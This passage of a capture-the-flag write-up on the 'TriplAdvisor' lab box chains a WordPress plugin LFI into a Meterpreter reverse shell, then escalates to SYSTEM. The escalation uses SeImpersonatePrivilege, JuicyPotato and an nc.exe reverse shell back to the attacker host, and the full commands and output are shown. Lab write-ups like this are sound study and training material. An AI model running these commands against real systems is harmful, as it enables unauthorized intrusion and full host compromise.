└─$ curl -s "http://tripladvisor:8080/wordpress/wp-content/plugins/editor//editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\xampp\apache\logs\access.log&cmd=C:\Windows\Temp\shell.exe" 

```
Back on the Metasploit console framework, the execution triggered the staged delivery mechanism. The payload called back to the active listener, transferred the operational memory blocks, and successfully spawned a stable access token.
```bash
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
LHOST => eth0
LPORT => 4444
[*] Started reverse TCP handler on 10.0.2.3:4444 
[*] Sending stage (232006 bytes) to 10.0.2.41
[*] Meterpreter session 1 opened (10.0.2.3:4444 -> 10.0.2.41:49160) at 2026-11-06 09:17:21 +0100

meterpreter > 


```
We now have persistent, interactive terminal management directly inside the victim machine's memory landscape. The initial access is realized.

## Privilege escalation
Now that a stable interactive Meterpreter session has been established, the next phase is to perform post-exploitation enumeration on the target system and elevate privileges from a service account to a full administrative level.

I started the privilege escalation analysis by querying the user context and reviewing the active service token privileges inside Meterpreter.
```bash
meterpreter > getuid
Server username: TRIPLADVISOR\websvc
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseWorkingSetPrivilege

meterpreter > 
```
With just two commands we have some juicy information:
- The Account: The session runs under a dedicated local service account context (TRIPLADVISOR\websvc).
- The Golden Ticket: The output shows that SeImpersonatePrivilege is active. This specific privilege permits a service account to duplicate or assume access tokens belonging to other users (often higher privileged accounts like SYSTEM) if a local system interaction can be intercepted.

Metasploit provides an automated elevation feature called getsystem. I attempted to run it first to check if a simple named-pipe impersonation attack or token duplication technique would succeed natively:
```bash
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: 1726 The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
meterpreter > 

```
The system successfully guarded against automated multi-handler attempts, causing the operation to fail. This meant a manual exploitation path leveraging our active `SeImpersonatePrivilege` token was required.

Given the OS build status (`Windows Version 6.1.7600`), the machine is highly vulnerable to a classic JuicyPotato local privilege escalation attack. JuicyPotato allows a user possessing impersonation tokens to force a local COM server connection to execute an arbitrary system command under elevated privileges.
Using Meterpreter's upload engine, I transferred `JuicyPotato.exe` along with a Windows native binary of Netcat (`nc.exe`) to a globally readable destination: `C:\Users\Public\Downloads\`.
```bash
meterpreter > upload JuicyPotato.exe c:\\users\\public\\downloads\\JuicyPotato.exe
[*] Uploading  : /home/emvee/Documents/TripleAdvisor/JuicyPotato.exe -> c:\users\public\downloads\JuicyPotato.exe
[*] Uploaded 339.50 KiB of 339.50 KiB (100.0%): /home/emvee/Documents/TripleAdvisor/JuicyPotato.exe -> c:\users\public\downloads\JuicyPotato.exe
[*] Completed  : /home/emvee/Documents/TripleAdvisor/JuicyPotato.exe -> c:\users\public\downloads\JuicyPotato.exe
meterpreter > upload nc.exe c:\\users\\public\\downloads\\nc.exe
[*] Uploading  : /home/emvee/Documents/TripleAdvisor/nc.exe -> c:\users\public\downloads\nc.exe
[*] Uploaded 58.00 KiB of 58.00 KiB (100.0%): /home/emvee/Documents/TripleAdvisor/nc.exe -> c:\users\public\downloads\nc.exe
[*] Completed  : /home/emvee/Documents/TripleAdvisor/nc.exe -> c:\users\public\downloads\nc.exe
meterpreter >
```

Before triggering the execution chain, I set up a localized raw connection handler on the attacking Kali Linux platform to wait on port `1234`.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ nc -lvp 1234
listening on [any] 1234 ...

```
Now we should start a shell on the victim and check if the files are present on the system.
```bash
meterpreter > shell
Process 2216 created.
Channel 18 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\xampp\htdocs\wordpress\wp-content\plugins\editor\editor\extensions\pagebuilder\includes>cd c:\Users\Public\Downloads
cd c:\Users\Public\Downloads

c:\Users\Public\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BCB3-AE45

 Directory of c:\Users\Public\Downloads

11/06/2026  09:35 AM    <DIR>          .
11/06/2026  09:35 AM    <DIR>          ..
11/06/2026  09:33 AM           347,648 JuicyPotato.exe
11/06/2026  09:35 AM            59,392 nc.exe
               2 File(s)        407,040 bytes
               2 Dir(s)  23,848,083,456 bytes free

c:\Users\Public\Downloads>


```
To verify if a privilege execution mechanism would successfully invoke processes as SYSTEM, I performed an initial non-destructive test execution, passing a standard CLSID block alongside a diagnostic query string (`whoami`).
```bash
c:\Users\Public\Downloads>JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public\Downloads>

```
The output confirmed `CreateProcessWithTokenW OK`, meaning the execution container accurately successfully bound a process under the context of `NT AUTHORITY\SYSTEM`.
With confirmation established, I updated the arguments (`-a`) to trigger a persistent callback sequence. The command instructs the system to invoke our previously uploaded `nc.exe` file, connect to the Kali architecture (`10.0.2.3 1234`), and pipe back an interactive shell instance (`-e cmd.exe`).
```bash
c:\Users\Public\Downloads>JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\downloads\nc.exe 10.0.2.3 1234 -e cmd.exe" -t *
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\downloads\nc.exe 10.0.2.3 1234 -e cmd.exe" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public\Downloads>

```
Over on the Kali platform, the local listener intercepted the transmission. A high-privilege administrative channel shell spawned immediately.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ nc -lvp 1234                                                                    
listening on [any] 1234 ...
connect to [10.0.2.3] from tripladvisor [10.0.2.41] 49170
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

```
With absolute administrative tracking privileges over the Windows host environment, I proceeded to loot both flags to conclude the assessment.
```bash
┌──(emvee㉿kali)-[~/Documents/TripleAdvisor]
└─$ nc -lvp 1234                                                                    
listening on [any] 1234 ...
connect to [10.0.2.3] from tripladvisor [10.0.2.41] 49170
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami;hostname;ipconfig;type c:\users\administrator\desktop\root.txt
whoami;hostname;ipconfig;type c:\users\administrator\desktop\root.txt
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>cd c:\users\administrator
cd c:\users\administrator

c:\Users\Administrator>cd desktop
cd desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BCB3-AE45

 Directory of c:\Users\Administrator\Desktop

08/15/2024  08:02 PM    <DIR>          .
08/15/2024  08:02 PM    <DIR>          ..
06/30/2024  09:10 AM                33 root.txt
               1 File(s)             33 bytes
               2 Dir(s)  23,848,083,456 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
<HERE IS THE ROOT FLAG>

c:\Users\Administrator\Desktop>cd c:\users\ 
cd c:\users\

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BCB3-AE45

 Directory of c:\Users

06/29/2024  12:26 PM    <DIR>          .
06/29/2024  12:26 PM    <DIR>          ..
06/29/2024  07:09 PM    <DIR>          Administrator
07/13/2009  08:52 PM    <DIR>          Public
06/29/2024  07:11 PM    <DIR>          websvc
               0 File(s)              0 bytes
               5 Dir(s)  23,848,562,688 bytes free

c:\Users>cd websvc\desktop\
cd websvc\desktop\

c:\Users\websvc\Desktop>type user.txt
type user.txt
<HERE IS THE USER FLAG>

```
Both flags captured. The target machine has been fully compromised, transitioning from an unauthenticated WordPress LFI exploit to absolute control under `NT AUTHORITY\SYSTEM`.

## Final thoughts
TriplAdvisor was a fantastic environment to practice exploit chaining, demonstrating how a web-layer vulnerability can easily bridge the gap into local OS compromise. 
It reminds us that network security is only as strong as its weakest, unpatched plugin.
Thanks for reading, and happy hacking! Until next time, stay safe and keep your systems updated.